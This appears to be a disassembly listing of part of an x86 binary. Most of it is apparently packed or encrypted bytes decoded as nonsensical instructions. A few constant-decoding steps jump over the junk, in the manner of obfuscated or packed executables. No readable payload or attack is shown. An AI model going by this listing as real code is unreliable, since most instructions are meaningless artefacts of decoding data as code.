  40a8db:	adc    BYTE PTR [ecx],al
  40a8dd:	jb     0x40a93a
  40a8df:	or     esp,ecx
  40a8e1:	add    BYTE PTR ds:0x2744ef72,ah
  40a8e7:	psubusb mm2,QWORD PTR [edi+0x22]
  40a8eb:	push   edi
  40a8ec:	push   eax
  40a8ed:	addr16 xchg ebx,eax
  40a8ef:	es mov eax,edi
  40a8f2:	pusha  
  40a8f3:	fsub   DWORD PTR [edi-0x5b]
  40a8f6:	xchg   BYTE PTR [edx-0x829a978],dh
  40a8fc:	pop    eax
  40a8fd:	and    BYTE PTR [edi-0x64],cl
  40a900:	aas    
  40a901:	mov    bl,ah
  40a903:	sub    eax,0x1a66546b
  40a908:	jg     0x40a8f6
  40a90a:	sbb    al,0xa5
  40a90c:	les    ebx,FWORD PTR [esi]
  40a90e:	cli    
  40a90f:	and    al,0xa2
  40a911:	xor    esi,ebx
  40a913:	push   ebx
  40a914:	lds    esp,FWORD PTR [edx-0x8]
  40a917:	and    BYTE PTR [esi-0x13212df9],bl
  40a91d:	push   ebx
  40a91e:	fcompp 
  40a920:	iret   
  40a921:	sub    BYTE PTR [ecx-0x13ba74c8],cl
  40a927:	mov    ebx,DWORD PTR [ebp-0x8]
  40a92a:	mov    ecx,0x7510850
  40a92f:	xor    eax,ecx
  40a931:	mov    esi,0x327298
  40a936:	jmp    0x40ac4f
  40a93b:	(bad)  
  40a93c:	xlat   BYTE PTR ds:[ebx]
  40a93d:	rcl    bh,1
  40a93f:	aad    0xd7
  40a941:	(bad)
  40a944:	xchg   ebx,eax
  40a945:	cdq    
  40a946:	add    DWORD PTR [ebx-0x256d1635],ecx
  40a94c:	cmp    DWORD PTR [eax+0x78],0x74
  40a950:	jle    0x40a9ca
  40a952:	js     0x40a8f1
  40a954:	inc    ecx
  40a955:	ins    BYTE PTR es:[edi],dx
  40a956:	or     eax,0xb2fb1526
  40a95b:	inc    edx
  40a95c:	sub    DWORD PTR fs:0x5ad776d3,esi
  40a963:	push   0xffffffab
  40a965:	and    bh,BYTE PTR [ecx-0x10d54d20]
  40a96b:	pop    esi
  40a96c:	pop    ecx
  40a96d:	and    esp,DWORD PTR [ecx]
  40a96f:	xor    BYTE PTR [ebp-0x6359f4ae],dl
  40a975:	xor    al,0xe6
  40a977:	push   ebp
  40a978:	sbb    ebx,eax
  40a97a:	loopne 0x40a97e
  40a97c:	or     al,BYTE PTR [ecx-0x766edd9d]
  40a982:	aaa    
  40a983:	arpl   WORD PTR [eax+0x78121338],dx
  40a989:	mov    esi,esi
  40a98b:	int    0x44
  40a98d:	scas   al,BYTE PTR es:[edi]
  40a98e:	mov    esp,0x7fcedf63
  40a993:	imul   edi,DWORD PTR [esp+ebp*1+0x52113bca],0x33
  40a99b:	rol    cl,cl
  40a99d:	adc    edi,DWORD PTR ds:0x91c1d56b
  40a9a3:	fdivp  st(1),st
  40a9a5:	add    esp,esp
  40a9a7:	pop    edx
  40a9a8:	cli    
  40a9a9:	xchg   ebp,eax
  40a9aa:	idiv   DWORD PTR [esi-0x23320a7c]
  40a9b0:	ror    BYTE PTR [edx],1
  40a9b2:	add    bh,BYTE PTR [ebx-0x4e]
  40a9b5:	adc    ebx,DWORD PTR [eax+0x4c99c07c]
  40a9bb:	adc    eax,0x553e70c9
  40a9c0:	sub    ebx,ebp
  40a9c2:	mov    ch,0x21
  40a9c4:	mov    ds:0xdb63fc3f,al
  40a9c9:	ret    
  40a9ca:	mov    dl,0xc3
  40a9cc:	addr16 enter 0x6a18,0xb
  40a9d1:	je     0x40a9f4
  40a9d3:	pushf  
  40a9d4:	cmp    edx,DWORD PTR [edi+eax*1-0x51]
  40a9d8:	mov    DWORD PTR [esi],0xa7afba85
  40a9de:	icebp  
  40a9df:	cmp    dl,dl
  40a9e1:	pop    ds
  40a9e2:	dec    eax
  40a9e3:	pop    esi
  40a9e4:	xor    bl,BYTE PTR [ebx]
  40a9e6:	rcr    DWORD PTR [eax+0x5dffd979],1
  40a9ec:	add    bl,BYTE PTR [ecx]
  40a9ee:	dec    DWORD PTR [ebp-0xb463d0d]
  40a9f4:	dec    edi
  40a9f5:	xor    eax,0x37487650
  40a9fa:	jbe    0x40aa46
  40a9fc:	add    DWORD PTR [ecx-0x45e92433],ebx
  40aa02:	ror    BYTE PTR [edi-0x51],0xd9
  40aa06:	data16 lock addr16 add al,0xbd
  40aa0b:	mov    al,ds:0xa8433544
  40aa10:	jge    0x40aa6b
  40aa12:	adc    al,0xcd
  40aa14:	popa   
  40aa15:	ficomp DWORD PTR [ebx+0x66]
  40aa18:	loop   0x40aa58
  40aa1a:	pop    ss
  40aa1b:	push   ebp
  40aa1c:	lahf   
  40aa1d:	scas   eax,DWORD PTR es:[edi]
  40aa1e:	jg     0x40aa56
  40aa20:	or     eax,0xdd8a5db6
  40aa25:	es jo  0x40a9f6
  40aa28:	or     DWORD PTR [esi-0xa],esp
  40aa2b:	ja     0x40aa02
  40aa2d:	mov    ebp,0x6544ac54
  40aa32:	jne    0x40aa1e
  40aa34:	retf   
  40aa35:	stos   BYTE PTR es:[edi],al
  40aa36:	xchg   edx,eax
  40aa37:	mov    ds:0x20b9c340,al
  40aa3c:	aas    
  40aa3d:	mov    dh,0x21
  40aa3f:	push   es
  40aa40:	test   esi,edx
  40aa42:	test   DWORD PTR [edx-0x2e],ecx
  40aa45:	or     esp,eax
  40aa47:	out    0x3f,al
  40aa49:	cs push edi
  40aa4b:	retf   0xb0ce
  40aa4e:	and    eax,0x1099629f
  40aa53:	mov    esi,0x479d3d26
  40aa58:	sub    dl,BYTE PTR [esi-0x704d51cb]
  40aa5e:	dec    BYTE PTR [eax+ebp*4-0x3633331d]
  40aa65:	ss jecxz 0x40aa33
  40aa68:	ins    DWORD PTR es:[edi],dx
  40aa69:	dec    esi
  40aa6a:	and    BYTE PTR [edx-0x47c5a0dd],bh
  40aa70:	test   BYTE PTR [eax-0x9],ah
  40aa73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa74:	test   al,0xad
  40aa76:	jg     0x40aacc
  40aa78:	sbb    dh,BYTE PTR [ecx+0x7b4436e8]
  40aa7e:	xor    ah,BYTE PTR [ecx]
  40aa80:	or     al,0x88
  40aa82:	and    BYTE PTR ds:[ecx+0x45],cl
  40aa86:	cmp    eax,0xdaf99c84
  40aa8b:	aaa    
  40aa8c:	dec    esp
  40aa8d:	jns    0x40aaf0
  40aa8f:	cs cmp al,0x7e
  40aa92:	adc    dh,ah
  40aa94:	jns    0x40aa1d
  40aa96:	mov    bl,0x67
  40aa98:	into   
  40aa99:	jecxz  0x40aa6b
  40aa9b:	pop    ss
  40aa9c:	pop    edx
  40aa9d:	pop    es
  40aa9e:	mov    cl,0xed
  40aaa0:	stos   BYTE PTR es:[edi],al
  40aaa1:	adc    DWORD PTR [edi+0x2d],esi
  40aaa4:	lea    ebx,[ebx-0x21]
  40aaa7:	mov    bl,0xd7
  40aaa9:	dec    ebp
  40aaaa:	mov    edi,DWORD PTR [ebx-0x60309c1f]
  40aab0:	push   esp
  40aab1:	inc    esp
  40aab2:	cmp    DWORD PTR [ebp+0x21],esi
  40aab5:	inc    ebx
  40aab6:	cmp    DWORD PTR [edx+0x41],ebp
  40aab9:	retf   
  40aaba:	or     al,0x34
  40aabc:	jae    0x40ab21
  40aabe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aabf:	repz sbb dl,bl
  40aac2:	(bad)  
  40aac3:	sub    dh,BYTE PTR [eax+eiz*1-0x21]
  40aac7:	les    eax,FWORD PTR [ebp-0x36]
  40aaca:	iret   
  40aacb:	push   es
  40aacc:	shl    BYTE PTR [ebx+0x4314a040],0x26
  40aad3:	jmp    0x78a7275e
  40aad8:	jo     0x40ab03
  40aada:	sahf   
  40aadb:	test   al,0x2
  40aadd:	ret    0x4414
  40aae0:	gs jae 0x40aafe
  40aae3:	(bad)  
  40aae4:	std    
  40aae5:	(bad)  
  40aae7:	fstp   DWORD PTR [eax+0x9360106]
  40aaed:	mov    bl,0x5c
  40aaef:	repz add DWORD PTR [edx+0x424c2aa8],edi
  40aaf6:	(bad)  
  40aaf7:	mov    cl,0xb0
  40aaf9:	aad    0x4c
  40aafb:	jne    0x40ab6b
  40aafd:	jo     0x40ab31
  40aaff:	stc    
  40ab00:	inc    ebx
  40ab01:	lahf   
  40ab02:	repnz mov cs,edx
  40ab05:	xor    edx,DWORD PTR [ebx]
  40ab07:	adc    al,0xb0
  40ab09:	or     DWORD PTR [eax+ecx*2],edx
  40ab0c:	sbb    al,dh
  40ab0e:	ret    0xb5b8
  40ab11:	jmp    0x2c12317f
  40ab16:	and    eax,0x18439883
  40ab1b:	gs hlt 
  40ab1d:	out    dx,eax
  40ab1e:	shr    BYTE PTR [esi+0x75],1
  40ab21:	test   al,0xd
  40ab23:	or     bl,bl
  40ab25:	mov    eax,0x36c20b9a
  40ab2a:	push   ecx
  40ab2b:	adc    DWORD PTR [edi+0x5872151a],edi
  40ab31:	retf   0x36fd
  40ab34:	inc    esi
  40ab35:	cli    
  40ab36:	clc    
  40ab37:	inc    esi
  40ab38:	jmp    0xa7ef:0xe53d6896
  40ab3f:	imul   edx,edx,0xffffffa2
  40ab42:	(bad)  
  40ab43:	nop
  40ab44:	adc    BYTE PTR [ecx],dl
  40ab46:	or     BYTE PTR [bp+di+0x6d67],bl
  40ab4b:	cdq    
  40ab4c:	adc    BYTE PTR [eax+0x19],ah
  40ab4f:	adc    eax,0xd922ee74
  40ab54:	in     eax,0x98
  40ab56:	add    eax,0x54d2253b
  40ab5b:	idiv   BYTE PTR [edx-0x1]
  40ab5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab5f:	(bad)  
  40ab60:	icebp  
  40ab61:	imul   esi,DWORD PTR [ecx-0x49122b1a],0x7a80558a
  40ab6b:	sbb    BYTE PTR [ebp+edx*4-0x2f],bl
  40ab6f:	icebp  
  40ab70:	mov    DWORD PTR [ebx],esi
  40ab72:	cmp    al,0xde
  40ab74:	mov    cl,0x79
  40ab76:	leave  
  40ab77:	rcr    DWORD PTR [ecx],1
  40ab79:	int    0x66
  40ab7b:	sahf   
  40ab7c:	or     dh,BYTE PTR [ecx-0x4d]
  40ab7f:	pop    ss
  40ab80:	mov    BYTE PTR [ebx],ch
  40ab82:	std    
  40ab83:	retf   0x84d1
  40ab86:	pop    ds
  40ab87:	icebp  
  40ab88:	add    DWORD PTR [eax+ecx*2],ecx
  40ab8b:	push   ecx
  40ab8c:	xchg   esp,eax
  40ab8d:	das    
  40ab8e:	cli    
  40ab8f:	xlat   BYTE PTR ds:[ebx]
  40ab90:	xchg   esi,eax
  40ab91:	(bad)  
  40ab92:	jp     0x40ab96
  40ab94:	jbe    0x40ab63
  40ab96:	repz inc esp
  40ab98:	mov    ds:0x404cbacc,al
  40ab9d:	jecxz  0x40ab28
  40ab9f:	xor    DWORD PTR [ebp+0x5b],eax
  40aba2:	push   ds
  40aba3:	cwde   
  40aba4:	sbb    al,0xaa
  40aba6:	out    0xae,al
  40aba8:	ret    0x191d
  40abab:	pop    ebx
  40abac:	xor    ebx,DWORD PTR [edx+0x36]
  40abaf:	test   DWORD PTR [ebp-0x9682cb],eax
  40abb5:	lds    ebx,FWORD PTR [ecx-0x33]
  40abb8:	and    BYTE PTR [ecx+0x49508b49],0xa7
  40abbf:	xor    DWORD PTR [eax+0x20],esi
  40abc2:	test   eax,0x230be971
  40abc7:	jns    0x40ab69
  40abc9:	dec    esi
  40abca:	jae    0x40ac16
  40abcc:	shl    DWORD PTR [eax+ebp*4+0x25d9cb4a],1
  40abd3:	test   DWORD PTR [esi-0x2a74050b],esp
  40abd9:	mov    ebx,0xf78fa57c
  40abde:	test   al,0x86
  40abe0:	cdq    
  40abe1:	and    DWORD PTR [edx-0x71],ebx
  40abe4:	into   
  40abe5:	fst    DWORD PTR es:[edi]
  40abe8:	jmp    0x40ac53
  40abea:	add    ah,dh
  40abec:	pop    ecx
  40abed:	(bad)  
  40abee:	mov    dh,0x4b
  40abf0:	pop    ecx
  40abf1:	lahf   
  40abf2:	xchg   edi,eax
  40abf3:	xlat   BYTE PTR ds:[ebx]
  40abf4:	cmp    BYTE PTR [esi+0x608dc396],al
  40abfa:	lea    edi,[eax]
  40abfc:	fwait
  40abfd:	inc    edi
  40abfe:	shr    BYTE PTR [ecx+0x1d],cl
  40ac01:	mov    eax,0xed210b74
  40ac06:	xchg   ecx,eax
  40ac07:	ins    BYTE PTR es:[edi],dx
  40ac08:	inc    eax
  40ac09:	enter  0x7a58,0x5
  40ac0d:	sbb    eax,0xc6cdc20
  40ac12:	pop    edx
  40ac13:	and    DWORD PTR [ecx+edi*2],eax
  40ac16:	lock adc ebp,0xed94e510
  40ac1d:	je     0x40abb7
  40ac1f:	jg     0x40abbd
  40ac21:	inc    esi
  40ac22:	xchg   BYTE PTR [eax-0x1c],ch
  40ac25:	das    
  40ac26:	rcr    BYTE PTR [edx],cl
  40ac28:	cwde   
  40ac29:	fsub   QWORD PTR [ebp-0x1b29924e]
  40ac2f:	push   0x292be654
  40ac34:	loop   0x40ac7a
  40ac36:	lea    edi,[ebx]
  40ac38:	mov    ebp,DWORD PTR [esi]
  40ac3a:	into   
  40ac3b:	out    0xbc,al
  40ac3d:	mov    bh,0x77
  40ac3f:	fwait
  40ac40:	xchg   edx,esp
  40ac42:	or     dl,al
  40ac44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac45:	btc    DWORD PTR [edi],ebx
  40ac48:	mov    ah,0x15
  40ac4a:	add    ebp,DWORD PTR [ecx]
  40ac4c:	dec    edi
  40ac4d:	mul    BYTE PTR [edi+0x33]
  40ac50:	fnstenv [ebx]
  40ac52:	rol    BYTE PTR [ebx],cl
  40ac54:	mov    BYTE PTR [ebx],0xde
  40ac57:	div    ebx
  40ac59:	mov    edx,DWORD PTR [ebp-0x20]
  40ac5c:	mov    DWORD PTR [ebp-0x2c],0x4f35
  40ac63:	cmp    eax,DWORD PTR [edx]
  40ac65:	je     0x40c955
  40ac6b:	mov    DWORD PTR [ebp-0xc],0x705fd8e
  40ac72:	lea    eax,[ebp-0xc]
  40ac75:	mov    DWORD PTR [ebp-0x10],eax
  40ac78:	mov    eax,DWORD PTR [ebp-0x10]
  40ac7b:	jmp    0x40af94
  40ac80:	aas    
  40ac81:	aas    
  40ac82:	iret   
  40ac83:	(bad)  
  40ac84:	iret   
  40ac85:	xlat   BYTE PTR ds:[ebx]
  40ac86:	xlat   BYTE PTR ds:[ebx]
  40ac87:	(bad)  
  40ac88:	fist   WORD PTR [eax]
  40ac8a:	push   eax
  40ac8b:	addps  xmm7,xmm3
  40ac8e:	dec    esp
  40ac8f:	lock (bad) 
  40ac91:	cmp    BYTE PTR [eax+0x78],0x74
  40ac95:	jle    0x40ad0f
  40ac97:	js     0x40ac78
  40ac99:	sbb    ebx,DWORD PTR [esi-0x3d]
  40ac9c:	cpuid  
  40ac9e:	pop    esp
  40ac9f:	sti    
  40aca0:	xor    al,0xc
  40aca2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aca3:	mov    ah,BYTE PTR [ecx-0x44]
  40aca6:	inc    ecx
  40aca7:	xchg   ebp,eax
  40aca8:	lds    ebx,FWORD PTR [ecx+0x5]
  40acab:	push   ebx
  40acac:	adc    eax,eax
  40acae:	mov    ch,0x91
  40acb0:	cdq    
  40acb1:	mov    esi,0x37dcd540
  40acb6:	push   eax
  40acb7:	pop    ds
  40acb8:	std    
  40acb9:	sub    eax,0xea5f67bc
  40acbe:	cmp    al,0xf0
  40acc0:	and    al,0xe0
  40acc2:	mov    edi,edi
  40acc4:	jne    0x40ac65
  40acc6:	adc    bl,0xed
  40acc9:	mov    dh,0x89
  40accb:	add    cl,BYTE PTR [esi]
  40accd:	push   ebx
  40acce:	(bad)  [ecx+edx*4+0x23142253]
  40acd5:	push   es
  40acd6:	jg     0x40ad16
  40acd8:	ficom  WORD PTR ds:0x46953a4c
  40acde:	inc    edi
  40acdf:	in     eax,dx
  40ace0:	xlat   BYTE PTR ds:[ebx]
  40ace1:	mov    ebx,0x6d0da432
  40ace6:	jmp    0x40ad64
  40ace8:	jecxz  0x40aca3
  40acea:	nop
  40aceb:	mov    ds:0xf846681b,al
  40acf0:	sub    al,0x15
  40acf2:	enter  0x1a7f,0x29
  40acf6:	stos   BYTE PTR es:[edi],al
  40acf7:	fucomip st,st(3)
  40acf9:	rcr    DWORD PTR [ebx+0x2f],1
  40acfc:	mov    bl,0xa7
  40acfe:	xchg   ebp,eax
  40acff:	mov    eax,0xef15d5da
  40ad04:	mov    edx,0xb6bbbd22
  40ad09:	rcl    BYTE PTR [eax-0x34afbcb5],0x5f
  40ad10:	enter  0xa6bb,0xea
  40ad14:	pop    ds
  40ad15:	out    0x6,eax
  40ad17:	dec    esi
  40ad18:	adc    eax,0xa9fb7f2d
  40ad1d:	loopne 0x40ad28
  40ad1f:	hlt    
  40ad20:	(bad)  
  40ad21:	cmp    edi,DWORD PTR [esi-0x4da925e0]
  40ad27:	jnp    0x40ada3
  40ad29:	or     ebx,ecx
  40ad2b:	cld    
  40ad2c:	ficomp WORD PTR [eax+edx*2+0x65]
  40ad30:	cmp    DWORD PTR [esi+eiz*2+0x76],0x44a09a7f
  40ad38:	shr    DWORD PTR [ebx+0x3b79ec22],1
  40ad3e:	xor    ebp,edx
  40ad40:	arpl   WORD PTR [ebx-0x7c],cx
  40ad43:	inc    esi
  40ad44:	mov    bl,0x95
  40ad46:	ficomp WORD PTR [edi]
  40ad48:	or     esi,0x79
  40ad4b:	jb     0x40ad82
  40ad4d:	xor    BYTE PTR ds:0xb483,bh
  40ad52:	and    eax,0xa8be447b
  40ad57:	ja     0x40adb4
  40ad59:	cmp    BYTE PTR [ecx],al
  40ad5b:	mov    esi,0xc81b7090
  40ad60:	shr    BYTE PTR [edx+0x65],cl
  40ad63:	not    DWORD PTR [ebp-0x6b]
  40ad66:	xor    BYTE PTR [ebx+edi*8-0x33],al
  40ad6a:	out    0xe,al
  40ad6c:	push   es
  40ad6d:	in     eax,dx
  40ad6e:	cs pop ebp
  40ad70:	out    0xf4,eax
  40ad72:	sub    al,0xb9
  40ad74:	jns    0x40ad3f
  40ad76:	and    al,0x3b
  40ad78:	dec    DWORD PTR [ebx]
  40ad7a:	adc    bl,BYTE PTR [ebx+0x31]
  40ad7d:	lahf   
  40ad7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad7f:	cli    
  40ad80:	jns    0x40ae00
  40ad82:	cmp    eax,DWORD PTR [esi-0x39]
  40ad85:	lods   al,BYTE PTR cs:[esi]
  40ad87:	sahf   
  40ad88:	jge    0x40adbd
  40ad8a:	int3   
  40ad8b:	jecxz  0x40ae04
  40ad8d:	jp     0x40ad2a
  40ad8f:	push   ebp
  40ad90:	mov    eax,ds:0xbc4b8d94
  40ad95:	pop    ebx
  40ad96:	sbb    al,0x5b
  40ad98:	out    0xd9,eax
  40ad9a:	sbb    edi,DWORD PTR [ebp+0x65dd0c18]
  40ada0:	sub    eax,eax
  40ada2:	dec    ebp
  40ada3:	or     eax,0x90212079
  40ada8:	cmp    al,0xb4
  40adaa:	mov    ds:0x605a750e,eax
  40adaf:	jmpw   0x9260
  40adb3:	sub    al,0x57
  40adb5:	add    eax,0x2caf7c9b
  40adba:	xor    BYTE PTR [edi+ebp*1+0x276d313e],dh
  40adc1:	retf   0xe14e
  40adc4:	jbe    0x40adf7
  40adc6:	nop
  40adc7:	pop    ss
  40adc8:	addr16 inc edi
  40adca:	imul   ebp,edi,0xffffffbe
  40adcd:	mov    ah,0x97
  40adcf:	and    BYTE PTR [edx],ch
  40add1:	adc    al,0x49
  40add3:	outs   dx,DWORD PTR ds:[esi]
  40add4:	js     0x40adac
  40add6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add7:	test   cl,bh
  40add9:	ja     0x40ae43
  40addb:	(bad)  
  40addc:	cli    
  40addd:	nop
  40adde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40addf:	shl    BYTE PTR [edx+0x318418b4],cl
  40ade5:	sbb    al,cl
  40ade7:	outs   dx,DWORD PTR ds:[esi]
  40ade8:	jno    0x40ad6a
  40adea:	lods   eax,DWORD PTR ds:[esi]
  40adeb:	sbb    dh,ch
  40aded:	add    DWORD PTR [ecx],edx
  40adef:	fist   DWORD PTR [edx-0x3d]
  40adf2:	(bad)  
  40adf3:	xor    DWORD PTR ds:0xc0271443,ecx
  40adf9:	cld    
  40adfa:	cmp    ebx,DWORD PTR [ebp+0x177f391a]
  40ae00:	fistp  QWORD PTR [edx+0x2c]
  40ae03:	scas   al,BYTE PTR es:[edi]
  40ae04:	arpl   WORD PTR [ebx-0x7b],dx
  40ae07:	jp     0x40adfb
  40ae09:	sbb    DWORD PTR [eax-0xbe94139],edi
  40ae0f:	jmp    0x3f5f:0x3eccf259
  40ae16:	sahf   
  40ae17:	sbb    eax,0x4dec7bbe
  40ae1c:	dec    eax
  40ae1d:	popa   
  40ae1e:	sar    BYTE PTR [eax-0x4e],0x52
  40ae22:	shl    DWORD PTR [ebx-0xd9e9231],1
  40ae28:	inc    edi
  40ae29:	ret    
  40ae2a:	xor    ebx,DWORD PTR [esi]
  40ae2c:	int    0xa
  40ae2e:	cmovl  edi,DWORD PTR [esi]
  40ae31:	cs jno 0x40ae4c
  40ae34:	dec    esp
  40ae35:	lea    ebx,[ebx-0x29]
  40ae38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae39:	loopne 0x40ade9
  40ae3b:	xor    eax,0xfbfa994c
  40ae40:	xchg   edx,eax
  40ae41:	int3   
  40ae42:	push   ebp
  40ae43:	mov    cl,0x78
  40ae45:	sar    cl,1
  40ae47:	xchg   edi,eax
  40ae48:	sbb    al,0x7c
  40ae4a:	in     al,0xce
  40ae4c:	sar    BYTE PTR [ebx+edx*1],0x47
  40ae50:	sbb    al,0xe0
  40ae52:	les    eax,FWORD PTR [ebx-0x384299a6]
  40ae58:	mov    esp,esi
  40ae5a:	retf   0xb934
  40ae5d:	sub    eax,DWORD PTR [edx+0x10ee472b]
  40ae63:	or     BYTE PTR [ecx+edx*4],ch
  40ae66:	push   edx
  40ae67:	and    al,0x13
  40ae69:	push   ebp
  40ae6a:	(bad)
  40ae6e:	imul   ebx,DWORD PTR [esi],0xc904a347
  40ae74:	adc    al,0x2e
  40ae76:	adc    eax,0xe7ee1363
  40ae7b:	(bad)  
  40ae7c:	push   ebp
  40ae7d:	mov    ecx,0x70df122d
  40ae82:	stc    
  40ae83:	(bad)  
  40ae84:	fist   DWORD PTR [ebx]
  40ae86:	push   ds
  40ae87:	les    edi,FWORD PTR [esi]
  40ae89:	test   eax,0x4bc6558b
  40ae8e:	in     eax,dx
  40ae8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae90:	sti    
  40ae91:	add    al,0x8b
  40ae93:	aaa    
  40ae94:	rcr    DWORD PTR [ecx],0xf
  40ae97:	push   edi
  40ae98:	mov    bh,0x4f
  40ae9a:	sti    
  40ae9b:	pop    es
  40ae9c:	inc    edi
  40ae9d:	dec    ebx
  40ae9e:	call   0xd142:0xd501826d
  40aea5:	mov    ds:0xbb255298,al
  40aeaa:	jb     0x40af0b
  40aeac:	repnz rcl DWORD PTR [edi+0x2043d448],cl
  40aeb3:	into   
  40aeb4:	rcl    cl,cl
  40aeb6:	mov    ch,0x78
  40aeb8:	lahf   
  40aeb9:	pop    ss
  40aeba:	sbb    eax,0x2d74c7f
  40aebf:	int3   
  40aec0:	push   ds
  40aec1:	add    cl,BYTE PTR [edi-0x53]
  40aec4:	ja     0x40aed7
  40aec6:	pop    DWORD PTR ds:[di]
  40aeca:	pop    ecx
  40aecb:	fs xor eax,0x501e001f
  40aed1:	sbb    al,0x1
  40aed3:	mov    BYTE PTR [edx-0x58],dl
  40aed6:	cmp    esp,ebp
  40aed8:	retf   0x30d5
  40aedb:	dec    esi
  40aedc:	out    dx,al
  40aedd:	push   esi
  40aede:	idiv   BYTE PTR [edx]
  40aee0:	mov    ecx,0xb654b093
  40aee5:	add    eax,0xa8063947
  40aeea:	xor    al,0x4c
  40aeec:	jne    0x40aed6
  40aeee:	jnp    0x40aeca
  40aef0:	cmp    ebp,DWORD PTR [ebp-0x3]
  40aef3:	mov    esi,ds
  40aef5:	pop    edx
  40aef6:	mov    esi,0xb7f75d9f
  40aefb:	iret   
  40aefc:	lahf   
  40aefd:	stc    
  40aefe:	mov    ah,BYTE PTR [edx+0x7e]
  40af01:	rcr    DWORD PTR [eax],cl
  40af03:	es mov dh,0xaf
  40af06:	mov    ah,0x32
  40af08:	inc    eax
  40af09:	popa   
  40af0a:	loop   0x40aeb4
  40af0c:	cli    
  40af0d:	out    dx,al
  40af0e:	repz inc esi
  40af10:	dec    ecx
  40af11:	jmp    0x803f:0x30e74022
  40af18:	and    DWORD PTR [esi-0x7fbc821],edx
  40af1e:	add    edi,esi
  40af20:	imul   esp,DWORD PTR [esi],0x6d
  40af23:	fsubr  DWORD PTR [ebp+0xf60e74d]
  40af29:	mov    al,dl
  40af2b:	std    
  40af2c:	xchg   BYTE PTR [esi-0x32],bl
  40af2f:	fs ins BYTE PTR es:[edi],dx
  40af31:	test   BYTE PTR [edi+0x688f72e4],0xa7
  40af38:	loope  0x40af08
  40af3a:	push   0xffffffa5
  40af3c:	push   ebx
  40af3d:	in     eax,0xbd
  40af3f:	(bad)  
  40af40:	mov    cs,WORD PTR [ecx+0x3a9580ad]
  40af46:	sbb    al,BYTE PTR [ecx-0xa]
  40af49:	idiv   DWORD PTR [eax+edi*1]
  40af4c:	btc    DWORD PTR [ecx],edi
  40af4f:	sbb    BYTE PTR [ebp+0x6518ee89],bl
  40af55:	xor    eax,ebp
  40af57:	cmp    ecx,DWORD PTR [esi]
  40af59:	xchg   DWORD PTR [esi+0x240af8df],esp
  40af5f:	sti    
  40af60:	xchg   ebp,eax
  40af61:	pop    ebx
  40af62:	data16 ss scas al,BYTE PTR es:[edi]
  40af65:	lods   eax,DWORD PTR ds:[esi]
  40af66:	xchg   BYTE PTR [edx+edi*8],dl
  40af69:	std    
  40af6a:	mov    edx,0x7a98c6f4
  40af6f:	or     DWORD PTR [eax+0x507bebb8],edx
  40af75:	aaa    
  40af76:	or     esi,eax
  40af78:	or     dh,cl
  40af7a:	inc    ebp
  40af7b:	pop    esi
  40af7c:	mov    ecx,0xe870a969
  40af81:	or     al,0x98
  40af83:	pop    es
  40af84:	add    eax,DWORD PTR [ebx-0x1e]
  40af87:	jp     0x40afa9
  40af89:	sti    
  40af8a:	pushf  
  40af8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af8c:	enter  0x1317,0xf8
  40af90:	jle    0x40afc4
  40af92:	inc    eax
  40af93:	into   
  40af94:	mov    edx,DWORD PTR [eax]
  40af96:	imul   edx,edx,0xf89ea9ed
  40af9c:	mov    DWORD PTR [eax],edx
  40af9e:	mov    eax,DWORD PTR [ebp-0xc]
  40afa1:	jmp    0x40b2ba
  40afa6:	sar    DWORD PTR ds:0xc9d9c1c9,cl
  40afac:	fcmovne st,st(5)
  40afae:	mov    bl,0x22
  40afb0:	fsub   st(2),st
  40afb2:	lahf   
  40afb3:	or     eax,0x85d2c10d
  40afb8:	js     0x40b032
  40afba:	je     0x40b03a
  40afbc:	js     0x40b036
  40afbe:	arpl   dx,cx
  40afc0:	ror    esp,0xdb
  40afc3:	repz int3 
  40afc5:	jmp    0x40b02d
  40afc7:	xor    esp,DWORD PTR [ecx]
  40afc9:	xchg   esp,eax
  40afca:	push   0xbdbebb98
  40afcf:	ffree  st(4)
  40afd1:	stos   BYTE PTR es:[edi],al
  40afd2:	xlat   BYTE PTR ds:[ebx]
  40afd3:	inc    edx
  40afd4:	cmp    ch,cl
  40afd6:	bnd jnp 0x40b012
  40afd9:	in     eax,0xe9
  40afdb:	pushf  
  40afdc:	sub    bl,BYTE PTR [ebx+eiz*2-0x42cb695e]
  40afe3:	jecxz  0x40afdb
  40afe5:	xchg   edi,eax
  40afe6:	les    eax,FWORD PTR [eax]
  40afe8:	dec    esp
  40afe9:	lahf   
  40afea:	dec    ecx
  40afeb:	scas   al,BYTE PTR es:[edi]
  40afec:	int    0x68
  40afee:	and    ch,ah
  40aff0:	adc    al,0xeb
  40aff2:	outs   dx,BYTE PTR ds:[esi]
  40aff3:	fstp   DWORD PTR [eax+0x1e]
  40aff6:	jmp    0x6565464e
  40affb:	mov    edi,0x75508585
  40b000:	(bad)  
  40b001:	dec    ebp
  40b002:	dec    ecx
  40b003:	sub    cl,BYTE PTR [esi]
  40b005:	push   ebx
  40b006:	xchg   ebx,eax
  40b007:	stc    
  40b008:	mov    eax,ds:0xc292132a
  40b00d:	dec    eax
  40b00e:	cdq    
  40b00f:	inc    ebx
  40b010:	jmp    0x1626b4df
  40b015:	add    eax,0xc94d5270
  40b01a:	clc    
  40b01b:	inc    eax
  40b01c:	sub    ebx,DWORD PTR [ecx+0x168e08a]
  40b022:	pop    ecx
  40b023:	push   ds
  40b024:	mov    ah,0xf1
  40b026:	adc    BYTE PTR [ecx+0x3a],ah
  40b029:	test   DWORD PTR [eax+0x1e7a269c],ecx
  40b02f:	pop    ebx
  40b030:	js     0x40b0b1
  40b032:	je     0x40b01c
  40b034:	dec    esp
  40b035:	or     al,bh
  40b037:	es jl  0x40b0b8
  40b03a:	fldcw  WORD PTR [edi]
  40b03c:	sub    DWORD PTR [ebp+0x4d9f604a],esp
  40b042:	fdivr  QWORD PTR [ebx+edx*2-0x64]
  40b046:	jb     0x40aff9
  40b048:	add    al,0xca
